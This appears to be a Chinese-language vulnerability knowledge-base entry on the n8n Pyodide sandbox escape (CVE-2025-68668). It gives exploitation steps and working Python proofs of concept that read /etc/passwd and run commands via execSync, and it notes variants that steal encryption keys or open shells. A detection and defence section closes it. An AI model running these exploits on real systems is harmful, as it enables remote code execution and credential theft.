---
id: web-nodejs-n8n-pyodide-xmlhttprequest-constructor-host-function-escape
title: n8n Pyodide Python Code 节点沙箱逃逸：js.XMLHttpRequest.constructor 取宿主 Function 读文件/execSync RCE（CVE-2025-68668）
type: scenario
domain: web
path: web/nodejs
technique: n8n-pyodide-xmlhttprequest-constructor-host-function-escape
aliases:
- CVE-2025-68668
- n8n Python 沙箱绕过
- Pyodide 沙箱逃逸
- XMLHttpRequest.constructor
- 宿主 Function 构造器
- n8n Python Code Node RCE
tags:
- n8n
- nodejs
- python
- pyodide
- sandbox-escape
- host-object
- function-constructor
- rce
- cve-2025-68668
- authenticated
cve:
- CVE-2025-68668
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: n8n 1.0.0 至 < 2.0.0
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:50:12+08:00'
  notes: 已对照原文与9张图核对：Pyodide.js 的 jsglobals 传入 console/fetch/AbortController/AbortSignal/Object/XMLHttpRequest、LoadPyodide 封锁 os.system/Object.constructor.constructor/sys.modules['js'] 均与源码截图一致；del sys.modules['js'] 恢复 js 模块、js.XMLHttpRequest.constructor 取宿主 Function、return process、fs.readFileSync('/etc/passwd') 成功（图05）、execSync('pwd') 返回 /home/node（图06）与原文一致。affected_versions n8n 1.0.0 至 <2.0.0 与 CVE 通告一致并已 set-versions。无 sources/source_url。未在本机复跑 PoC。
---

## 一句话结论

n8n 1.0.0 至 2.0.0 之前的 Python Code 节点用 Pyodide 执行用户代码，但把宿主的 `XMLHttpRequest` 等对象放进 `jsglobals`；攻击者恢复被替换的 `js` 模块后，用 `js.XMLHttpRequest.constructor` 取得宿主环境的 `Function` 构造器，执行 `return process` 拿到 Node 主进程对象，再经 `process.mainModule.require('fs')`/`child_process.execSync` 读文件或执行命令（CVE-2025-68668）。

## 原理

- **执行环境**：`PythonSandbox.js` 通过 `LoadPyodide` 在 Node `vm` 上下文中加载 Pyodide；`jsglobals` 显式传入 `console`、`fetch`、`AbortController`、`AbortSignal`、`Object`、`XMLHttpRequest`，这些是宿主 Node 对象，不是 Pyodide/WASM 内部对象。
- **现有防护**：Pyodide 初始化后执行一段 Python：把 `os.system` 替换为 `blocked_function`；把 `Object.constructor.constructor` 置为 blocked；并用 `blocked_module` 替换 `sys.modules['js']`，试图阻断 `js` 桥接。
- **防护绕过一**：`sys.modules['js']` 只是运行时替换，用户代码可以先 `del sys.modules['js']` 再 `import js`，重新拿到真实的 `js` 模块（Pyodide 的 JS 互操作桥）。
- **防护绕过二**：`js.XMLHttpRequest` 是宿主传入的函数/类，`XHR.constructor` 指向宿主环境的 `Function`，而不是沙箱内被封锁的 `Object`。`Function("return process")()` 因此在宿主 Node 作用域执行，返回主进程的 `process` 对象。
- **危害**：拿到 `process` 后，`process.mainModule.require('fs').readFileSync('/etc/passwd')` 可读宿主文件；`require('child_process').execSync(cmd)` 可执行命令。命令以 n8n 主进程用户身份运行，可读取加密密钥、凭据与工作流数据。
- **为什么成立**：安全边界应阻止不可信代码接触任何宿主对象；Pyodide 的 `js` 互操作是设计能力，而宿主导出的 `XMLHttpRequest` 等对象自带 `constructor` 链，等价于把 `Function` 构造器泄露给沙箱。
- **影响版本**：n8n 1.0.0 至 2.0.0 之前；2.0.0 起修复（文章引用 GHSA-62r4-hw23-cc8v）。

## 触发条件

- n8n 版本 `>=1.0.0, <2.0.0`，Python Code 节点（Pyodide/Beta）可用。
- 攻击者拥有可创建/编辑并执行工作流的账号（已认证，不要求管理员）。
- 实例允许 Code 节点执行 Python；`NODES_EXCLUDE` 未禁用 Code 节点。
- 沙箱所在进程可读目标文件或执行命令（通常为 n8n 主进程或 task runner）。

## 利用步骤

1. 登录 n8n，新建工作流，添加 Code 节点并选择 Python（Beta/Pyodide）。
2. 写入恢复 `js` 模块并取宿主 Function 的代码：
   ```python
   import sys
   if 'js' in sys.modules:
       del sys.modules['js']
   import js
   HostFunction = js.XMLHttpRequest.constructor
   process = HostFunction("return process")()
   ```
3. 读文件验证：`fs = process.mainModule.require('fs'); fs.readFileSync('/etc/passwd','utf-8')`。
4. 命令执行：用 HostFunction 包一层纯 JS，避免 Python 接触 Buffer：
   ```python
   exec_in_js = HostFunction("cmd", "const cp=process.mainModule.require('child_process');return cp.execSync(cmd).toString();")
   out = exec_in_js('id')
   ```
5. 执行工作流，确认返回命令输出或文件内容；随后可读取 `/tmp`、n8n 配置、环境变量与凭据。
6. 授权测试只用无害命令（`id`、`pwd`、写标记文件），不读取真实用户数据。

## PoC

读文件：

```python
import sys
if 'js' in sys.modules:
    del sys.modules['js']
import js

HostFunction = js.XMLHttpRequest.constructor
process = HostFunction("return process")()
fs = process.mainModule.require('fs')
content = fs.readFileSync('/etc/passwd', 'utf-8')
return {"users": [l.split(':')[0] for l in content.split('\n')[:5]]}
```

命令执行：

```python
import sys
if 'js' in sys.modules:
    del sys.modules['js']
import js

HostFunction = js.XMLHttpRequest.constructor
exec_in_js = HostFunction("cmd", """
    const cp = process.mainModule.require('child_process');
    return cp.execSync(cmd).toString();
""")
return {"status": "RCE_SUCCESS", "output": exec_in_js('pwd')}
```

原文在 n8n 1.116.0 环境验证：读 `/etc/passwd` 成功，`pwd` 返回 `/home/node`（图 05、06）。

## 变体与关联

- 变体：`js.fetch`、`js.AbortController`、`js.console` 等宿主对象也可能通过 `.constructor` 链拿到宿主 Function；可逐个尝试。
- 变体：即使 `js` 模块被替换，也可通过其它 Python 内省路径（`sys.modules`、`__builtins__`、异常对象）寻找宿主对象引用。
- 变体：拿到 `process` 后可进一步 `process.env` 读取 `N8N_ENCRYPTION_KEY`、数据库凭据，或加载 `child_process` 反弹 Shell。
- 关联：[[web-nodejs-n8n-python-ctypes-cdll-system-sandbox-bypass]]（同 CVE 的 ctypes 绕过路径）、[[web-nodejs-n8n-python-task-runner-eobj-sandbox-escape-rce]]（CVE-2026-0863 AST 黑名单绕过）、[[ai-security-agent-security-prefab-ui-pyodide-deno-host-file-escape]]（Pyodide js 桥接越权的同类案例）。

## 检测与防御

- 升级 n8n 到 2.0.0 或更高；确认 Python Code 节点不再向 Pyodide 暴露可推导出宿主 `Function` 的对象。
- 沙箱加固：不要向不可信执行环境传入 `XMLHttpRequest`、`fetch`、`Object` 等宿主对象；对 `js` 模块使用不可绕过的代理/白名单；在独立低权限容器中运行 Code 节点。
- 检测：审计 Code 节点中的 `XMLHttpRequest`、`constructor`、`return process`、`mainModule`、`require('fs')`、`child_process`、`execSync` 等字符串；监控 n8n 进程派生的异常子进程与越权文件读取。
- 响应：隔离实例，轮换 `N8N_ENCRYPTION_KEY`、数据库与外部凭据，审计工作流与执行日志。
